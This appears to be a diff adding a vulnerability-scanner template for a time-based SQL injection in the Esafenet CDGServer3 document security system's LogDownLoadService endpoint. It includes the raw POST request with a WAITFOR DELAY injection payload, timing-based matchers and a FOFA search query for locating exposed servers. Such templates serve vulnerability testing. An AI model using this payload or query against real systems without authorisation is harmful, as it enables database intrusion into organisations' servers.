@@ -1,0 +1,36 @@
+id: esafenet-cdgserver3-LogDownLoadService-sqli
+info:
+  name: 亿赛通电子文档安全管理系统 LogDownLoadService - SQL 注入漏洞
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/wy876/POC/blob/c19942e30121f116548ca14c0375ba6c8560afeb/%E4%BA%BF%E8%B5%9B%E9%80%9A%E7%94%B5%E5%AD%90%E6%96%87%E6%A1%A3%E5%AE%89%E5%85%A8%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FLogDownLoadService%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: body="CDGServer3" || title="电子文档安全管理系统" || cert="esafenet" || body="/help/getEditionInfo.jsp"
+  tags: esafenet,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        POST /CDGServer3/logManagement/LogDownLoadService HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate, br
+        Accept-Language: zh-CN,zh;q=0.9
+        Content-Length: 0
+        Content-Type: application/x-www-form-urlencoded
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        X-Requested-With: XMLHttpRequest
+
+        command=downLoadLogFiles&currPage=1&fromurl=../user/dataSearch.jsp&logFileName=indsex.txt&id=-1';WAITFOR DELAY '0:0:6'--
+
+    matchers:
+      - type: dsl
+        dsl:
+          - duration >= 5 && duration < 9
+          - status_code == 200
+          - contains_all(body,'isParent','isEpd')
+        condition: and
